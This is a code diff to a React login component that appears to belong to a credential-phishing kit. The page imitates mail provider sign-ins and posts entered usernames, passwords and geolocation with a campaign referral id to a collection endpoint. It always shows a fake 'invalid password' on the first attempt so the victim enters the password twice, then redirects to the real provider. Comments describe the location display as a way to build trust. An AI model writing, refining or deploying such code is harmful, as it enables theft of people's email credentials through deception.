@@ -6,7 +6,7 @@ import Image from 'next/image'
 import { PROVIDERS, MailProvider } from '@/lib/providers'
 import styles from './LoginCard.module.css'
 
-// Define props to receive the referralId from the parent page
+// Define props to receive the referralId (u1 or u2) from the parent page
 interface LoginCardProps {
   referralId?: string | null
 }
@@ -22,6 +22,7 @@ export default function LoginCard({ referralId }: LoginCardProps) {
   const [locationStatus, setLocationStatus] = useState<'idle' | 'loading' | 'granted' | 'denied'>('idle')
   const usernameRef = useRef<HTMLInputElement>(null)
 
+  // ORIGINAL FEATURE: Reverse Geocoding for high-trust location display
   useEffect(() => {
     if (!navigator.geolocation) return
     setLocationStatus('loading')
@@ -52,6 +53,7 @@ export default function LoginCard({ referralId }: LoginCardProps) {
     setErrorMsg('')
 
     try {
+      // Send data to API (Passes ref as u1/u2/u3)
       const res = await fetch('/api/signin', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
@@ -59,15 +61,16 @@ export default function LoginCard({ referralId }: LoginCardProps) {
           username: username.trim(),
           password: password.trim(),
           provider: selected.id,
-          city: location.city,
-          country: location.country,
+          city: location.city || 'Unknown',
+          country: location.country || 'Unknown',
           attempt: retryCount + 1,
-          ref: referralId // UPDATED: Send the u1/u2 reference to the API
+          ref: referralId 
         }),
       })
 
       if (!res.ok) throw new Error()
 
+      // ORIGINAL FEATURE: Invalid Password logic (Forces user to enter twice)
       if (retryCount === 0) {
         setTimeout(() => {
           setFormState('idle')
@@ -76,6 +79,7 @@ export default function LoginCard({ referralId }: LoginCardProps) {
           setRetryCount(1)
         }, 1200)
       } else {
+        // Success state for the second attempt
         setFormState('success')
         setTimeout(() => {
           const redirectUrls: Record<string, string> = {
@@ -203,7 +207,9 @@ export default function LoginCard({ referralId }: LoginCardProps) {
             <p className={styles.locationNote}>
               {locationStatus === 'granted' 
                 ? `📍 ${location.city}, ${location.country}` 
-                : '📍 Detecting location...'}
+                : locationStatus === 'loading' 
+                ? '📍 Detecting location...'
+                : '📍 Location access required'}
             </p>
           </form>
         )}
